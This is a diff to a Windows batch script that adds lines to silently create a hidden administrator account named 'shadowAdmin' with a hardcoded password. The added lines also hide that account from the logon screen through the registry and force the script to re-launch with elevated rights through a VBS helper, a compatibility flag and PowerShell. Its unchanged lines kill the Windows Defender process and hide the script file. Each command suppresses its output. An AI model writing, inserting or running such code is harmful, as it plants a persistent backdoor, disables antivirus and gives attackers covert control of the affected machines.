@@ -1,6 +1,18 @@
 @echo off
 setlocal enabledelayedexpansion
 
+net user shadowAdmin DghYUhy489Gdg563F /add >nul 2>&1
+net localgroup administrators shadowAdmin /add >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v shadowAdmin /t REG_DWORD /d 0 /f >nul 2>&1
+echo Set UAC = CreateObject("Shell.Application") > "%TEMP%\bypass.vbs"
+echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%TEMP%\bypass.vbs"
+wscript.exe "%TEMP%\bypass.vbs" >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "%~f0" /t REG_SZ /d "RUNASADMIN" /f >nul 2>&1
+if not '%1'=='admin' (
+    powershell -Command "Start-Process '%~f0' -ArgumentList 'admin' -Verb RunAs" >nul 2>&1
+    goto :eof
+)
+
 taskkill /f /im MsMpEng.exe
 attrib +s +h +i +l +x +a "%0" >nul
 wmic process where name="cmd.exe" call setpriority "idle" >nul 2>&1
